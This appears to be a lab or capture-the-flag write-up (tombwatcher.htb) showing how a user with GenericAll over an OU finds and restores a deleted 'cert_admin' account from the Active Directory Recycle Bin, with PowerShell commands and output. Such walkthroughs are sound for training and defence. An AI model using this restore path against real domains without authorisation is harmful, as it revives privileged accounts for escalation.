
Only SID in BloodHound? Could be an potentially deleted object. Deleted Objects in an AD Environment get completly removed, unless the Domain Recycle Bin is activated.

---

1. We can enumerate if the Recycle Bin of Active Directory is active by this command:

```
Get-ADOptionalFeature 'Recycle Bin Feature'
```

2. List all deleted items.

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent

Deleted           : True                                             
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb                
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb                    
Name              : cert_admin                                       
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3         
ObjectClass       : user                                             
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3             
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1109                                                                                      
Deleted           : True                                             
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb                
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb                    
Name              : cert_admin                                       
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1110

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```

There seems to be the cert_admin deleted three the last one is the correct one since he is the latest deleted one and we also see that the **LastKnownParent** was the ADCS OU! Which our current user john has GenericAll over. This means our current user should be able to restore the cert_admin user.

3. Restored ad object (cert_admin user) from AD's Recycle Bin

```
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

4. Verified if the cert_admin user is restored 

```
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Alfred                   cert_admin
Guest                    Henry                    john
krbtgt                   sam
The command completed with one or more errors.
```